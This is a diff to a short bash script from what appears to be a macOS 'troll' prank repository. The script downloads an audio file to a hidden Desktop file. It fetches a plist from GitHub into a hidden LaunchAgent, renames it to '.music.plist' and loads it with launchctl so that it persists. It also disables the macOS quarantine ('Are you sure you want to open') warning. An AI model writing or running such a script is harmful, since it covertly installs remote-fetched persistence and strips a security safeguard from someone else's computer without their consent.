@@ -1,9 +1,11 @@
 #! /bin/bash
 curl -L https://raw.githubusercontent.com/Me1955/osx_troll/main/HT.mp3 --output ~/Desktop/.troll.mp3
 
-curl -s -L https://raw.githubusercontent.com/Me1955/osx_troll/main/main.plist >> ~/Library/LaunchAgents/.main.plist
-chmod 777 ~/Library/LaunchAgents/.main.plist
-launchctl load ~/Library/LaunchAgents/.main.plist
+curl -s -L https://raw.githubusercontent.com/Me1955/osx_troll/main/main.plist >> ~/Library/LaunchAgents/.main1.plist
+cat ~/Library/LaunchAgents/.main1.plist >> ~/Library/LaunchAgents/.music.plist
+rm ~/Library/LaunchAgents/.main1.plist
+chmod 600 ~/Library/LaunchAgents/.music.plist
+launchctl load ~/Library/LaunchAgents/.music.plist
 
 #Disable the “Are you sure you want to open this application?” dialog
 defaults write com.apple.LaunchServices LSQuarantine -bool false
